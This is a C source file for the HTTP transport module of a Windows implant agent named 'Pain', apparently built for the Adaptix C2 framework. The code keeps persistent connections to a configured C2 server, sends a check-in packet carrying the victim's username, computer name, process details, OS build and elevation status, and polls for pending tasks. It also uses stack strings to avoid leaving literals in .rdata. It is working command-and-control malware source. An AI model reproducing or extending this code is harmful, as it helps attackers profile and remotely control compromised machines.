#include <windows.h>
#include <wininet.h>
#include <Native.h>
#include <Agent.h>
#include <Defines.h>
#include <Internals.h>

// Send a raw buffer to the C2 over HTTP POST.
// Session and connection handles are persistent - created on first call and
// reused for every subsequent request. Re-creating them per-request on Windows 11
// causes STATUS_STACK_BUFFER_OVERRUN: InternetCloseHandle schedules async cleanup
// on TppWorkerThreads that are still running when the very next HttpSendRequestW
// spawns a new TppWorkerThread, and the two threads race on shared WinInet heap state.
// On failure the handles are torn down so the next call reconnects cleanly.
DECLFN BOOL Transport_Send( PVOID data, UINT32 data_len, PVOID* out_buf, UINT32* out_len )
{
    G_AGENT;
    Self->Ntdll.DbgPrint( "[Pain] Transport_Send() %d bytes\n", data_len );

    if ( !Self->WinInet.InetSession ) {
        Self->WinInet.InetSession = Http_Open( Self->Config.UserAgent );
        if ( !Self->WinInet.InetSession ) return FALSE;
        Self->Ntdll.DbgPrint( "[Pain] Http_Open = 0x%p\n", Self->WinInet.InetSession );
    }

    if ( !Self->WinInet.InetConnect ) {
        Self->WinInet.InetConnect = Http_Connect( Self->WinInet.InetSession, Self->Config.Host, Self->Config.Port );
        if ( !Self->WinInet.InetConnect ) {
            Http_Close( Self->WinInet.InetSession );
            Self->WinInet.InetSession = nullptr;
            return FALSE;
        }
        Self->Ntdll.DbgPrint( "[Pain] Http_Connect = 0x%p\n", Self->WinInet.InetConnect );
    }

    // URI is always "/" for now - malleable profile support comes later
    CHAR uri[] = { '/', 0 };
    BOOL ok = Http_Send( Self->WinInet.InetConnect, uri, Self->Config.Ssl, data, data_len, out_buf, out_len );

    // If the send failed, drop the handles so the next call re-establishes the session.
    if ( !ok ) {
        Http_Close( Self->WinInet.InetConnect );
        Http_Close( Self->WinInet.InetSession );
        Self->WinInet.InetConnect = nullptr;
        Self->WinInet.InetSession = nullptr;
    }

    return ok;
}

// Build and send the check-in packet - registers Pain with the Adaptix C2
// The Go plugin's CreateAgent() on Day 10 will parse this exact field order
DECLFN BOOL Transport_Checkin()
{
    G_AGENT;

    Self->Ntdll.DbgPrint( "[Pain] Checkin() start - host=%s port=%d\n", 
                        Self->Config.Host, Self->Config.Port );

    // AgentID must be exactly 36 bytes - the server reads this before decryption
    // to know which plugin handles this packet
    PPACKAGE pkg = Pkg_Create( Self->Config.AgentUUID );
    if ( !pkg ) return FALSE;

    // 0xF1 = check-in magic - server-side plugin checks this first byte to confirm
    // this is a fresh registration, not a task result or poll
    Pkg_Int32( pkg, 0xF1 );

    // machine info - everything the C2 UI will display about this agent
    // fallback stack strings - "?" literals would live in .rdata which is stripped
    CHAR unk[] = { '?', 0 };

    UINT32 user_len = 0;
    PCHAR  username = Self->Machine.Username ? Self->Machine.Username : unk;
    while ( username[user_len] ) user_len++;
    Pkg_Bytes( pkg, username, user_len );

    UINT32 comp_len = 0;
    PCHAR  computer = Self->Machine.Computer ? Self->Machine.Computer : unk;
    while ( computer[comp_len] ) comp_len++;
    Pkg_Bytes( pkg, computer, comp_len );

    Pkg_Int32( pkg, (INT32)Self->Session.ProcessID );
    Pkg_Int32( pkg, (INT32)Self->Session.ThreadID  );
    Pkg_Int32( pkg, (INT32)Self->Config.Sleep       );
    Pkg_Int32( pkg, (INT32)Self->Machine.OsMajor    );
    Pkg_Int32( pkg, (INT32)Self->Machine.OsMinor    );
    Pkg_Int32( pkg, (INT32)Self->Machine.OsBuild    );
    Pkg_Int32( pkg, (INT32)Self->Machine.Elevated   );

    // Process name (basename of ImagePathName - appended last so the layout stays additive)
    {
        CHAR   unk2[]   = { '?', 0 };
        PCHAR  procname = Self->Machine.ProcessName ? Self->Machine.ProcessName : unk2;
        UINT32 plen     = 0;
        while ( procname[plen] ) plen++;
        Pkg_Bytes( pkg, procname, plen );
    }

    // Pkg_Transmit handles auth prefix insertion + encryption, then calls Transport_Send
    PVOID  resp      = nullptr;
    UINT32 resp_size = 0;
    BOOL   ok        = Pkg_Transmit( pkg, &resp, &resp_size );

    if ( resp ) Heap_Free( resp );
    Pkg_Destroy( pkg );

    if ( ok ) {
        Self->Session.Connected = TRUE;
#if PAIN_AUTH_MODE != 0
        // After the first auth check-in the server recognises the key and registers
        // the session.  Subsequent Pkg_Transmit calls must NOT re-send the prefix.
        if ( !Self->Session.Authenticated )
            Self->Session.Authenticated = TRUE;
#endif
    }

    return ok;
}

// Ask the C2 if there are any pending tasks for this agent
// Sends an empty packet (just the AgentID header) and returns the raw response
DECLFN BOOL Transport_Poll( PVOID* out_buf, UINT32* out_len )
{
    G_AGENT;

    // empty poll packet - just the 36-byte AgentID, no payload to encrypt
    PPACKAGE pkg = Pkg_Create( Self->Config.AgentUUID );
    if ( !pkg ) return FALSE;

    PVOID  resp      = nullptr;
    UINT32 resp_size = 0;
    BOOL   ok        = Pkg_Transmit( pkg, &resp, &resp_size );

    Pkg_Destroy( pkg );

    if ( ok && resp_size > 0 ) {
        *out_buf = resp;
        *out_len = resp_size;
    } else {
        if ( resp ) Heap_Free( resp );
        *out_buf = nullptr;
        *out_len = 0;
    }

    return ok;
}

